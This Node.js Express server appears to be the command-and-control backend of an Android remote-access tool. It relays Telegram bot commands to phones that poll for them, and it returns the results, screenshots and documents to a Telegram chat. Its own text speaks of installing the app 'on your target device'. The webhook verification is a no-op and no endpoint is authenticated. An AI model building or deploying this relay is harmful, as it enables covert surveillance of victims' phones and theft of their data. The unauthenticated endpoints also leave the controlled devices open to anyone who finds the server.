const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map(); // deviceId -> { chatId, lastSeen, pendingCommands }

// Middleware
app.use(express.json());

// Verify webhook requests are from Telegram
function verifyTelegramWebhook(req, res, next) {
    // Optional: Add verification logic
    next();
}

// Webhook endpoint for Telegram
app.post('/webhook', verifyTelegramWebhook, async (req, res) => {
    const update = req.body;
    console.log('📩 Received update:', JSON.stringify(update, null, 2));

    if (update.message) {
        const chatId = update.message.chat.id;
        const text = update.message.text;
        const messageId = update.message.message_id;

        // Handle commands
        if (text.startsWith('/')) {
            await handleCommand(chatId, text, messageId);
        }
    }

    res.sendStatus(200);
});

// Endpoint for devices to check pending commands
app.get('/api/commands/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device && device.pendingCommands.length > 0) {
        const commands = device.pendingCommands;
        device.pendingCommands = [];
        res.json({ commands });
    } else {
        res.json({ commands: [] });
    }
});

// Endpoint for devices to report command results
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    const device = devices.get(deviceId);
    if (device) {
        // Send result back to Telegram
        await sendTelegramMessage(device.chatId, 
            `✅ Command executed:\n${command}\n\nResult: ${result || error}`);
    }
    
    res.sendStatus(200);
});

// Endpoint for devices to register
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    devices.set(deviceId, {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    });
    
    console.log(`📱 Device registered: ${deviceId} for chat ${chatId}`);
    
    await sendTelegramMessage(chatId, 
        `✅ *Device Connected*\n\n` +
        `Device: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n\n` +
        `Ready to receive commands!`);
    
    res.json({ status: 'registered' });
});

// Endpoint to check server status
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        timestamp: Date.now()
    });
});

// Command handler
async function handleCommand(chatId, command, messageId) {
    console.log(`🎯 Handling command ${command} from chat ${chatId}`);

    // Find device for this chat
    let deviceId = null;
    for (const [id, device] of devices.entries()) {
        if (device.chatId === chatId) {
            deviceId = id;
            break;
        }
    }

    if (!deviceId) {
        await sendTelegramMessage(chatId, 
            '❌ No device registered for this chat. Please install and run the app on your target device first.');
        return;
    }

    // Add command to device's pending queue
    const device = devices.get(deviceId);
    device.pendingCommands.push({
        command,
        messageId,
        timestamp: Date.now()
    });

    // Acknowledge command receipt
    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
}

// Helper to send Telegram messages
async function sendTelegramMessage(chatId, text) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
    }
}

// Helper to send photo
async function sendTelegramPhoto(chatId, photoBuffer, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBuffer, 'screenshot.jpg');
        formData.append('caption', caption);
        
        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (error) {
        console.error('Error sending photo:', error.response?.data || error.message);
    }
}

// Helper to send document
async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', documentBuffer, filename);
        formData.append('caption', caption);
        
        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (error) {
        console.error('Error sending document:', error.response?.data || error.message);
    }
}

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Webhook server running on port ${PORT}`);
    console.log(`📱 Webhook URL: https://your-app.onrender.com/webhook`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
});
